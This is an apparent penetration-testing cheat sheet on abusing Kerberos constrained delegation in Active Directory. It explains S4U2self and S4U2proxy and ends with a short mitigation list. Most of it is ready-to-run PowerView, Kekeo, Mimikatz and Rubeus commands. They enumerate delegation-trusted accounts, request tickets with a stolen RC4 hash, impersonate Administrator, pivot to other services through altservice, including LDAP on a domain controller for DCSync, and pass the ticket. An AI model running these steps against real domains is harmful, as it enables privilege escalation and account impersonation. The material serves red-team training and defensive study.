# Constrained Delegation

Using this a Domain admin can allow 3rd parties to impersonate a user or computer against a service of a machine.

- Service for User to self (S4U2self): If a service account has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION (T2A4D), then it can obtains a TGS for itself (the service) on behalf of any other user.
- Service for User to Proxy(S4U2proxy): A service account could obtain a TGS on behalf any user to the service set in msDS-AllowedToDelegateTo. To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.

Note: If a user is marked as ‘Account is sensitive and cannot be delegated ’ in AD, you will not be able to impersonate them.

This means that if you compromise the hash of the service you can impersonate users and obtain access on their behalf to the service configured (possible privesc).
Also, you won't only have access to the service that user is able to impersonate, but also to any service that uses the same account as the allowed one (because the SPN is not being checked, only privileges). For example, if you have access to CIFS service you can also have access to HOST service. Moreover, notice that if you have access to LDAP service on DC, you will have enough privileges to exploit a DCSync.

## Tools

> [PowerView] (<https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView>)
>
> [Mimikatz] (<https://github.com/ParrotSec/mimikatz>)
>
> [Rubeus] (<https://github.com/GhostPack/Rubeus.git>)
>
> [Kekeo] (<https://github.com/gentilkiwi/kekeo.git>)

### Import Module

```PS
Import-Module .\Powerview.ps1
. .\Powerview.ps1
```

#### Enumerate using Powerview

```PS
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

#### Exploit using Kekeo & Mimikatz

Obtain a TGT for the Constained allowed user

```PS
tgt::ask /user:<username> /domain:<domain name> /rc4:<rc4-hash>
```

Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)

```PS
tgs::s4u /tgt:<tgt-ticket> /user:<username>@<domain> /service:<service-name>|ldap/<domain-name>
```

Load the TGS in memory

```PS
Invoke-Mimikatz -Command '"kerberos::ptt <filename> <Ticket-kirbi-file>"'  
```

#### Exploit using Rubeus

Obtain a TGT for the Constained allowed user

```PS
.\Rubeus.exe asktgt /user:<username> /rc4:<rc4-hash> /outfile:<Outfile.kirbi>
```

Obtain a TGS of the Administrator user to self

```PS
.\Rubeus.exe s4u /ticket:<Ticket-file.kirbi> /impersonateuser:<username; Administrator> /outfile:<outfile-name>
```

Obtain service TGS impersonating Administrator (CIFS)

```PS
.\Rubeus.exe s4u /ticket:<Ticket-file.kirbi> /tgs:<TGS-Ticket-File> /msdsspn:"<account-SPN>" /outfile:<outfile-name>
```

Impersonate Administrator on different service (HOST)

```PS
.\Rubeus.exe s4u /ticket:<Ticket-file.kirbi> /tgs:<TGS-Ticket-File> /msdsspn:"<account-SPN>" /altservice:<Servicename> /outfile:<outfile-name>
```

Load ticket in memory

```PS
.\Rubeus.exe ptt /ticket:<ticket-file-name>
```

## Mitigation

- Disable kerberos delegation where possible
- Limit DA/Admin logins to specific services
- Set "Account is sensitive and cannot be delegated" for privileged accounts.
